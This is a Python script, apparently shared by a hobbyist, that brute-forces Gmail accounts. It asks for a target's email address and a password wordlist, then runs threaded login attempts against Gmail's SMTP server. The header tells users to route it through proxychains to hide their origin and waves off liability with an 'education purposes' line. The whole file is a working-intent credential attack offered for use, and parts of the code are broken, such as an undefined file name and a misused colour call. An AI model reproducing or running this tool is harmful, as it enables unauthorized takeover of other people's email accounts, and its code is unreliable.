#!/usr/bin/python
#Gmail-Brute
#Date 17th/May/2020
#Brute-forcing gmail Accounts

'''
##################
##################
Use Proxychains While Running This Script
Am not Liable for any damage caused By This Script
Happy Hacking Pal :-))
##################
##################
'''

#Code Starts Here
import time
import smtplib
import threading
import codecs
from termcolor import colored


try:
	 import pyfiglet ; banner=pyfiglet.figlet_format("GMAIL-BRUTE")
except:
	print(colored("Failed to detect pyfiglet.\n","Install pyfiglet\n", "yellow")) ; banner="GMAIL-BRUTE"


print(colored(banner,"red"))
print(colored("GmailBrute Script","blue"))
print(colored("Written By GiddySpurz","blue"))
print(colored("For Education Purposes Only","blue"))


username = input(colored("[*] Enter Targets Email Address: ","yellow"))
passwdfile = input(colored("[*]  Enter Path To The Password File: ","blue"))
threads = int(input(colored("N_Threads To Use: (Use 5 - 10)","green")))
file = codecs.open(passwdfile, 'r', errors='ignore')


smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


def connect_gmail(user, password):
	print(colored("Trying password {}".format(password), "red"))
	try:
		smtpserver.login(user, password)
		print(colored("[+] Password Found: %s" % password, "green"))
		file = open(password.txt,"w")


	except smtplib.SMTPAuthenticationError:
		
		pass

	except Exception as e:
		pass

x = 0
for password in file.readlines():
	password = password.strip("\n")
	thread = threading.Thread(target = connect_gmail, args = (username, password,))
	thread.start()
	x+=1
	if x%threads == 0:
		time.sleep(2)

	else:
		pass
